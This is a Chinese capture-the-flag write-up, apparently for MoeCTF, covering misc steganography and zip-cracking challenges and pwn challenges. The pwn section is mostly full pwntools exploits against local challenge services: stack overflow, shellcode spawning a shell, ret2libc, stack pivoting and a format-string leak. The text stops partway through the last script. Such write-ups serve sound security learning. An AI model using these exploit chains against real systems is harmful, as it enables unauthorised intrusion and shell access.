var e={html:`<h2 class="md-h md-h2" id="misc"><span class="md-hash" aria-hidden="true">## </span><span class="md-h-text">misc</span></h2>
<h3 class="md-h md-h3" id="rush"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">Rush</span></h3>
<p>gif动图，抽帧第12帧有二维码但缺角，用ppt补全第三个角扫码即可</p>
<h3 class="md-h md-h3" id="ez_lsb"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_LSB</span></h3>
<p>丢进StegSolve，勾上red通道即可</p>
<h3 class="md-h md-h3" id="ez_锟斤拷"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_锟斤拷????</span></h3>
<p>exp:</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">22 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">full_to_half</span>(<span class="hljs-params">text</span>):
    result = []
    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text:
        code = <span class="hljs-built_in">ord</span>(char)
        <span class="hljs-keyword">if</span> code == <span class="hljs-number">0x3000</span>:
            result.append(<span class="hljs-string">&#x27; &#x27;</span>)
        <span class="hljs-keyword">elif</span> <span class="hljs-number">0xFF01</span> &lt;= code &lt;= <span class="hljs-number">0xFF5E</span>:
            result.append(<span class="hljs-built_in">chr</span>(code - <span class="hljs-number">0xFEE0</span>))
        <span class="hljs-keyword">else</span>:
            result.append(char)
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(result)

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    s = f.read().strip()

b = s.encode(<span class="hljs-string">&#x27;gb18030&#x27;</span>)
original = b.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)

flag_full = original
flag_half = full_to_half(flag_full)

<span class="hljs-built_in">print</span>(flag_half)</code></pre></div>
<h3 class="md-h md-h3" id="sstv"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">SSTV</span></h3>
<p>用RX-SSTV，直接播放音频使用内录作为麦克风即可解析为图像，读取flag</p>
<h3 class="md-h md-h3" id="encrypted_pdf"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">encrypted_pdf</span></h3>
<p>hashcat爆破密码为qwe123，flag藏在图片后，选中复制即可</p>
<h3 class="md-h md-h3" id="捂住一只耳"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">捂住一只耳</span></h3>
<p>用Audacity打开，其中一个声道有摩斯密码，读取即为flag</p>
<h3 class="md-h md-h3" id="enchantment"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">Enchantment</span></h3>
<p>用Wireshark打开，发现里面有png文件传输，dump出来发现图中有奇怪的文字，网上搜索得知为标准银河字母加密，对照写出flag</p>
<h3 class="md-h md-h3" id="ez_ssl"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_ssl</span></h3>
<p>在http请求中可以发现sslkey.log，导入Wireshark在http请求中找到一个zip，zip注释中说密码是7位数字，爆破即可</p>
<h3 class="md-h md-h3" id="ez_png"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_png</span></h3>
<p>最后一个idat很短，发现zlib文件头，提取出来解压即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">9 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">import</span> binascii

<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;789CCBCD4F4D2E49ABCE30744971CD8B0F3089CCF14F7489F7F4D3F54C3109A90500A8D00A5F18&#x27;</span>
result = binascii.unhexlify(<span class="hljs-built_in">id</span>)
<span class="hljs-built_in">print</span>(result)
result = zlib.decompress(result)
<span class="hljs-built_in">print</span>(result)
</code></pre></div>
<h3 class="md-h md-h3" id="万里挑一"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">万里挑一</span></h3>
<p>先写个脚本生成字典：</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">110 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> zipfile
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> shutil
<span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm

<span class="hljs-keyword">def</span> <span class="hljs-title function_">try_extract</span>(<span class="hljs-params">zip_path, extract_to, password=<span class="hljs-literal">None</span></span>):
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_ref:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">if</span> password:
                    zip_ref.extractall(extract_to, pwd=password.encode())
                <span class="hljs-keyword">else</span>:
                    zip_ref.extractall(extract_to)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> e:
                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;encrypted&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(e):
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">raise</span>
    <span class="hljs-keyword">except</span> (zipfile.BadZipFile, EOFError):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Unexpected error with <span class="hljs-subst">{zip_path}</span>: <span class="hljs-subst">{e}</span>&quot;</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_nested_zips</span>(<span class="hljs-params">start_zip, output_folder=<span class="hljs-string">&quot;extracted&quot;</span>, depth=<span class="hljs-number">0</span>, max_depth=<span class="hljs-number">20</span></span>):
    <span class="hljs-keyword">if</span> depth &gt; max_depth:
        <span class="hljs-keyword">return</span> []
    
    passwords = []
    current_extract = os.path.join(output_folder, <span class="hljs-string">f&quot;layer_<span class="hljs-subst">{depth}</span>&quot;</span>)
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(current_extract):
        os.makedirs(current_extract)
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> try_extract(start_zip, current_extract):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> try_extract(start_zip, current_extract, <span class="hljs-string">&quot;&quot;</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to extract <span class="hljs-subst">{start_zip}</span> at depth <span class="hljs-subst">{depth}</span>&quot;</span>)
            <span class="hljs-keyword">return</span> passwords
    
    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(current_extract):
        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
            file_path = os.path.join(root, file)
            
            <span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Processing <span class="hljs-subst">{file_path}</span> at depth <span class="hljs-subst">{depth}</span>&quot;</span>)
                new_passwords = extract_nested_zips(file_path, output_folder, depth+<span class="hljs-number">1</span>, max_depth)
                passwords.extend(new_passwords)
            
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
                        content = f.read()
                        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;The password is:([a-f0-9]+)&#x27;</span>, content)
                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
                            passwords.append(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))
                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found password at depth <span class="hljs-subst">{depth}</span>: <span class="hljs-subst">{<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)}</span>&quot;</span>)
                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error reading <span class="hljs-subst">{file_path}</span>: <span class="hljs-subst">{e}</span>&quot;</span>)

    
    <span class="hljs-keyword">return</span> passwords

<span class="hljs-keyword">def</span> <span class="hljs-title function_">unlock_zip</span>(<span class="hljs-params">lock_zip, passwords</span>):
    <span class="hljs-string">&quot;&quot;&quot;Try each password to unlock the lock.zip file.&quot;&quot;&quot;</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(lock_zip):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">{lock_zip}</span> not found&quot;</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\\nTrying <span class="hljs-subst">{<span class="hljs-built_in">len</span>(passwords)}</span> passwords to unlock <span class="hljs-subst">{lock_zip}</span>...&quot;</span>)
    
    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> tqdm(passwords, desc=<span class="hljs-string">&quot;Testing passwords&quot;</span>):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">with</span> zipfile.ZipFile(lock_zip, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_ref:
                zip_ref.extractall(pwd=password.encode())
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;password: <span class="hljs-subst">{password}</span>&quot;</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># Clear previous extraction if exists</span>
    <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;extracted&quot;</span>):
        shutil.rmtree(<span class="hljs-string">&quot;extracted&quot;</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting deep extraction...&quot;</span>)
    passwords = extract_nested_zips(<span class="hljs-string">&#x27;password.zip&#x27;</span>, max_depth=<span class="hljs-number">50</span>)
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> passwords:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\nNo passwords found in the nested structure.&quot;</span>)
        <span class="hljs-keyword">return</span>
    
    unique_passwords = []
    seen = <span class="hljs-built_in">set</span>()
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> passwords:
        <span class="hljs-keyword">if</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:
            seen.add(p.strip())
            unique_passwords.append(p)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\\nFound <span class="hljs-subst">{<span class="hljs-built_in">len</span>(unique_passwords)}</span> unique passwords.&quot;</span>)
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dict.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> pwd <span class="hljs-keyword">in</span> unique_passwords:
            f.write(pwd + <span class="hljs-string">&#x27;\\n&#x27;</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;已创建字典文件 dict.txt 包含 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(unique_passwords)}</span> 个密码&quot;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    main()
</code></pre></div>
<p>用AAPR在字典中找到密码，获得flag.zip</p>
<p>flag.zip中有明文.exe，是pe文件，头是固定的，使用bkcrack明文攻击即可</p>
<h2 class="md-h md-h2" id="pwn"><span class="md-hash" aria-hidden="true">## </span><span class="md-h-text">pwn</span></h2>
<h3 class="md-h md-h3" id="ez_u64"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ez_u64</span></h3>
<p>数据转换</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">11 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">52128</span>)


p.recvuntil(<span class="hljs-string">b&quot;Here is the hint.&quot;</span>)
num_bytes = p.recv(<span class="hljs-number">8</span>)
num_value = u64(num_bytes)
p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)
p.sendline(<span class="hljs-built_in">str</span>(num_value).encode())
p.interactive()
</code></pre></div>
<h3 class="md-h md-h3" id="eztext"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">EZtext</span></h3>
<p>简单栈溢出覆盖返回地址</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">15 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">51054</span>)

treasure_addr = <span class="hljs-number">0x4011B6</span>
ret_addr = <span class="hljs-number">0x4011DE</span> <span class="hljs-comment"># gadget</span>
p.recvuntil(<span class="hljs-string">b&quot;how many bytes do you need to overflow the stack?\\n&quot;</span>)
p.sendline(<span class="hljs-string">b&quot;32&quot;</span>)  <span class="hljs-comment"># 16 + 8(ret) + 8(treasure) = 32</span>

payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span>
payload += p64(ret_addr)    <span class="hljs-comment"># 用于栈对齐的 ret 指令</span>
payload += p64(treasure_addr)  <span class="hljs-comment"># 目标函数</span>

p.send(payload)
p.interactive()
</code></pre></div>
<h3 class="md-h md-h3" id="ezshellcode"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezshellcode</span></h3>
<p>先把内存设置为可读可写可执行，然后发shellcode即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">19 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>

io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1234</span>)
<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>


io.recvuntil(<span class="hljs-string">b&quot;I will give you some choices. Choose wisely!&quot;</span>)
log.info(<span class="hljs-string">&quot;Sending choice &#x27;4&#x27; to set memory as RWX&quot;</span>)
io.sendline(<span class="hljs-string">b&quot;4&quot;</span>)
io.recvuntil(<span class="hljs-string">b&quot;think about the permissions you just set.&quot;</span>)
shellcode = asm(shellcraft.sh())
log.info(<span class="hljs-string">&quot;Generated shellcode:&quot;</span>)
<span class="hljs-built_in">print</span>(hexdump(shellcode))
io.sendline(shellcode)

io.interactive()</code></pre></div>
<h3 class="md-h md-h3" id="find-it"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">find it</span></h3>
<p>问答题</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">text</span><span class="md-code-meta">7 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-text">I've hidden the fd of stdout. Can you find it?
3
You are right.What would you like to see?
/flag
What is its fd?
1
moectf{******}</code></pre></div>
<h3 class="md-h md-h3" id="认识libc"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">认识libc</span></h3>
<p>ezlibc青春版，已经执行过printf，无需二次返回main</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">35 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)

<span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span>
io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1234</span>)
elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)


io.recvuntil(<span class="hljs-string">b&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: &quot;</span>)
leaked_printf_str = io.recvline().strip()
leaked_printf_addr = <span class="hljs-built_in">int</span>(leaked_printf_str, <span class="hljs-number">16</span>)
log.success(<span class="hljs-string">f&quot;printf address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(leaked_printf_addr)}</span>&quot;</span>)

libc.address = leaked_printf_addr - libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]
log.success(<span class="hljs-string">f&quot;libc base address: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(libc.address)}</span>&quot;</span>)

pop_rdi_ret = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi; ret&#x27;</span>)))
bin_sh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>))
system_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]
ret_gadget = pop_rdi_ret + <span class="hljs-number">1</span> 

offset_to_rbp = <span class="hljs-number">64</span>
payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_rbp
payload += p64(<span class="hljs-number">0xdeadbeefcafebabe</span>)
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)
io.sendline(payload)

io.interactive()</code></pre></div>
<h3 class="md-h md-h3" id="ezpivot"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">ezpivot</span></h3>
<p>栈迁移</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">45 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&#x27;info&#x27;</span>
context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span>
p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1234</span>)

rop = ROP(elf)
leave_ret_gadget = <span class="hljs-number">0x40120f</span>
pop_rdi_ret_gadget = rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>]).address
ret_gadget = rop.find_gadget([<span class="hljs-string">&#x27;ret&#x27;</span>]).address
system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]
desc_addr = elf.symbols[<span class="hljs-string">&#x27;desc&#x27;</span>]

<span class="hljs-comment"># 这里我们预留0x800的空间给新栈，太小会导致system函数无法运行</span>
buffer_headroom = <span class="hljs-number">0x800</span>
rop_chain_addr = desc_addr + buffer_headroom

rop_chain = p64(pop_rdi_ret_gadget)
rop_chain += p64(desc_addr)             <span class="hljs-comment"># RDI -&gt; 指向缓冲区的开头，即 &quot;/bin/sh&quot;</span>
rop_chain += p64(ret_gadget)            <span class="hljs-comment"># 栈对齐</span>
rop_chain += p64(system_addr)           <span class="hljs-comment"># 跳转到 system 函数</span>

<span class="hljs-comment"># [/bin/sh\\x00] + [padding] + [Fake RBP for leave] + [ROP Chain]</span>
payload1 = <span class="hljs-string">b&#x27;/bin/sh\\x00&#x27;</span>
padding_size = buffer_headroom - <span class="hljs-built_in">len</span>(payload1)
payload1 += <span class="hljs-string">b&#x27;\\x00&#x27;</span> * padding_size
payload1 += p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)     <span class="hljs-comment"># Fake RBP</span>
payload1 += rop_chain

final_payload_to_send = <span class="hljs-string">b&#x27;-1 &#x27;</span> + payload1
p.recvuntil(<span class="hljs-string">b&#x27;the length of your introduction.\\n&#x27;</span>)
p.send(final_payload_to_send)
p.recvuntil(<span class="hljs-string">b&#x27;Ok,we got your introduction!\\n&#x27;</span>)

offset_to_rbp = <span class="hljs-number">12</span>
payload2_pivot = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_rbp
payload2_pivot += p64(rop_chain_addr)
payload2_pivot += p64(leave_ret_gadget)

p.recvuntil(<span class="hljs-string">b&#x27;Now, please tell us your phone number:\\n&#x27;</span>)
p.send(payload2_pivot)

p.interactive()</code></pre></div>
<h3 class="md-h md-h3" id="fmt"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">fmt</span></h3>
<p>格式化字符串漏洞，这里懒得本地调试确定偏移了，直接远程暴力尝试</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">93 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>
PORT = <span class="hljs-number">52618</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">is_letter</span>(<span class="hljs-params">byte_val</span>):
    <span class="hljs-keyword">return</span> (<span class="hljs-string">b&#x27;a&#x27;</span>[<span class="hljs-number">0</span>] &lt;= byte_val &lt;= <span class="hljs-string">b&#x27;z&#x27;</span>[<span class="hljs-number">0</span>]) <span class="hljs-keyword">or</span> (<span class="hljs-string">b&#x27;A&#x27;</span>[<span class="hljs-number">0</span>] &lt;= byte_val &lt;= <span class="hljs-string">b&#x27;Z&#x27;</span>[<span class="hljs-number">0</span>])

<span class="hljs-keyword">def</span> <span class="hljs-title function_">find_offsets_remote</span>():
    p = remote(HOST, PORT)

    <span class="hljs-keyword">try</span>:
        start_offset = <span class="hljs-number">7</span>
        end_offset = <span class="hljs-number">25</span>
        probe_payload = <span class="hljs-string">b&quot;|&quot;</span>.join([<span class="hljs-string">f&quot;%<span class="hljs-subst">{i}</span>$p&quot;</span>.encode() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start_offset, end_offset)])
        
        p.recvuntil(<span class="hljs-string">b&quot;what&#x27;s your name?\\n&quot;</span>)
        log.info(<span class="hljs-string">f&quot;发送单次探测载荷: <span class="hljs-subst">{probe_payload}</span>&quot;</span>)
        p.sendline(probe_payload)
        
        p.recvuntil(<span class="hljs-string">b&#x27;Nice to meet you,&#x27;</span>)
        leaked_data = p.recvline().strip()
        leaked_parts = leaked_data.split(<span class="hljs-string">b&#x27;|&#x27;</span>)
        
        offset_s2_val = <span class="hljs-literal">None</span>
        offset_v4_ptr = <span class="hljs-literal">None</span>

        <span class="hljs-keyword">for</span> index, part <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(leaked_parts):
            current_offset = start_offset + index
            <span class="hljs-keyword">if</span> part.startswith(<span class="hljs-string">b&#x27;0x5&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> offset_v4_ptr:
                offset_v4_ptr = current_offset
                log.success(<span class="hljs-string">f&quot;找到 v4 指针的偏移: <span class="hljs-subst">{current_offset}</span> -&gt; <span class="hljs-subst">{part.decode()}</span>&quot;</span>)
            <span class="hljs-keyword">try</span>:
                <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;nil&#x27;</span> <span class="hljs-keyword">in</span> part:
                    <span class="hljs-keyword">continue</span>
                leaked_val = <span class="hljs-built_in">int</span>(part, <span class="hljs-number">16</span>)
                leaked_bytes = p64(leaked_val)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(is_letter(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> leaked_bytes[:<span class="hljs-number">5</span>]) <span class="hljs-keyword">and</span> leaked_bytes[<span class="hljs-number">5</span>] == <span class="hljs-number">0</span>:
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> offset_s2_val:
                        offset_s2_val = current_offset
                        log.success(<span class="hljs-string">f&quot;找到 s2 内容的偏移: <span class="hljs-subst">{current_offset}</span> -&gt; <span class="hljs-subst">{leaked_bytes[:<span class="hljs-number">5</span>].decode()}</span>&quot;</span>)
            <span class="hljs-keyword">except</span> (ValueError, IndexError):
                <span class="hljs-keyword">continue</span>
        p.close()

        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> offset_s2_val <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> offset_v4_ptr:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>
        <span class="hljs-keyword">return</span> offset_s2_val, offset_v4_ptr

    <span class="hljs-keyword">except</span> EOFError:
        p.close()
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">offset_s2, offset_v4</span>):
    log.info(<span class="hljs-string">f&quot;s2_offset=<span class="hljs-subst">{offset_s2}</span>, v4_offset=<span class="hljs-subst">{offset_v4}</span>&quot;</span>)
    p = remote(HOST, PORT)

    <span class="hljs-keyword">try</span>:
        payload = <span class="hljs-string">f&#x27;%<span class="hljs-subst">{offset_s2}</span>$p.%<span class="hljs-subst">{offset_v4}</span>$s&#x27;</span>.encode()

        log.info(<span class="hljs-string">f&quot;payload: <span class="hljs-subst">{payload}</span>&quot;</span>)
        p.recvuntil(<span class="hljs-string">b&quot;what&#x27;s your name?\\n&quot;</span>)
        p.sendline(payload)

        p.recvuntil(<span class="hljs-string">b&#x27;Nice to meet you,&#x27;</span>)
        leaked_data = p.recvline().strip()
        log.info(<span class="hljs-string">f&quot;leak: <span class="hljs-subst">{leaked_data}</span>&quot;</span>)
        leaked_s2_hex, leaked_v4_str = leaked_data.split(<span class="hljs-string">b&#x27;.&#x27;</span>)
        s2_value = <span class="hljs-built_in">int</span>(leaked_s2_hex, <span class="hljs-number">16</span>)
        treasure1 = p64(s2_value)[:<span class="hljs-number">5</span>]
        log.success(<span class="hljs-string">f&quot;s2: <span class="hljs-subst">{treasure1}</span>&quot;</span>)
        treasure2 = leaked_v4_str[:<span class="hljs-number">5</span>]
        log.success(<span class="hljs-string">f&quot;v4 content: <span class="hljs-subst">{treasure2}</span>&quot;</span>)
        p.recvuntil(<span class="hljs-string">b&quot;Can you find them?\\n&quot;</span>)
        p.sendline(treasure1)

        p.recvuntil(<span class="hljs-string">b&quot;Yeah,another one?\\n&quot;</span>)
        p.sendline(treasure2)

        p.recvuntil(<span class="hljs-string">b&quot;You got it!\\n&quot;</span>)
        p.interactive()

    <span class="hljs-keyword">except</span> EOFError:
        p.close()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    s2_offset, v4_offset = find_offsets_remote()

    <span class="hljs-keyword">if</span> s2_offset <span class="hljs-keyword">and</span> v4_offset:
        exploit(s2_offset, v4_offset)
</code></pre></div>
<h3 class="md-h md-h3" id="randomlock"><span class="md-hash" aria-hidden="true">### </span><span class="md-h-text">randomlock</span></h3>
<p>分析二进制可知seed恒为1，c++生成一串即可</p>
<div class="md-code"><div class="md-code-bar"><span class="md-code-lang">python</span><span class="md-code-meta">28 lines</span><button class="md-code-copy" type="button" data-copy>copy</button></div><pre class="md-code-body"><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> 
PORT = <span class="hljs-number">54065</span>

correct_passwords = [
    <span class="hljs-number">9383</span>,
    <span class="hljs-number">886</span>,
    <span class="hljs-number">2777</span>,
    <span class="hljs-number">6915</span>,
    <span class="hljs-number">7793</span>,
    <span class="hljs-number">8335</span>,
    <span class="hljs-number">5386</span>,
    <span class="hljs-number">492</span>,
    <span class="hljs-number">6649</span>,
    <span class="hljs-number">1421</span>
]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    p = remote(HOST, PORT)
    <span class="hljs-keyword">for</span> i, password <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(correct_passwords):
        p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)
        log.info(<span class="hljs-string">f&quot;发送密码 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>: <span class="hljs-subst">{password}</span>&quot;</span>)
        p.sendline(<span class="hljs-built_in">str</span>(password).encode())
    p.interactive()

